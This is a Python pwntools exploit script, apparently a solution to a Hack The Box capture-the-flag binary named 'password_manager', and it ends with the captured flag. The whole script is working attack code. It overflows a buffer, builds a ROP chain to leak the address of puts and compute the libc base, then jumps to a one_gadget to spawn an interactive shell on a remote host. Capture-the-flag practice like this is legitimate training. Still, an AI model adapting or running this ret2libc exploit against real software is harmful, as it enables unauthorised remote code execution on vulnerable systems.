from pwn import *

'''data part'''
onegadget = [0x4f432,0x4f3d5,0x10a41c]
# 0x00000000004012a3 : pop rdi ; ret
#0x00000000004007a6 : ret
s = remote("159.65.90.8",31939)
# s = process("./password_manager")
elf = ELF("./password_manager")
libc = ELF('./libc.so.6')
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
_start = elf.symbols['_start']

# pause()

def recv_pass():
    s.recvuntil("[*] Main password: ")
    main_pass = s.recvuntil('\n')
    log.info("main pass : %s"%main_pass)
    return main_pass

def send_overflow(main_pass,payload):
    s.sendlineafter(">",'2')
    s.sendlineafter("[!] Insert main password:",main_pass)
    overflow_payload = b'n'+b'\x00'*0x77
    overflow_payload += payload
    s.sendlineafter("to continue?",overflow_payload)

#phrase 1: calc libc base
pass1 = recv_pass()
pop_rdi = 0x00000000004012a3
calc_payload = p64(pop_rdi)
calc_payload += p64(puts_got)
calc_payload += p64(puts_plt)
calc_payload += p64(_start)
send_overflow(pass1,calc_payload)
s.recvuntil('[!] Password has not been changed!\n')
puts_addr = u64(s.recv(6)+b'\x00'*2)
log.info("leak puts: 0x%x"%puts_addr)

# calc base
base = puts_addr - libc.symbols['puts']
log.info("libc base: 0x%x"%base)


# phrase 2: call one_gadget
pass2 = recv_pass()
shell_payload = p64(0x00000000004007a6) + p64(onegadget[0]+base)
send_overflow(pass2, shell_payload)


s.interactive()
s.close()
# HTB{str0ng_p455w0rd5_4r3_n0t_3n0ugh_4_r3t_2_libC!}